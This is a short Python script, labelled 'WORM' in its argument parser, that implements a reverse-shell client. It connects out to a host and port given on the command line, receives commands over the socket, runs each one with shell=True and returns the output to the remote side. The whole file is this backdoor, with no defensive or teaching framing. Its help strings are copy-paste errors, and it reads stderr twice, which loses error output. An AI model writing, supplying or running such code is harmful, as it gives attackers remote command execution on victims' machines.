#!/usr/bin/env python
# _*_ coding: utf-8 _*_

import socket
import argparse
import subprocess


def main():
    parse = argparse.ArgumentParser(description="WORM")
    parse.add_argument('-t', '--target', help="Number of duplicates", dest='host', required=True)
    parse.add_argument('-p', '--port', help="Number of duplicates", dest='port', required=True)
    args = parse.parse_args()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((args.host, int(args.port)))
    s.send("1".encode('utf-8'))

    while True:
        command = s.recv(1024)
        if command.decode('utf-8') == "exit":
            break
        res = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if res.stderr.read().decode('utf-8') != "":
            s.send(res.stderr.read())
        else:
            s.send(res.stdout.read())

    s.close()


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()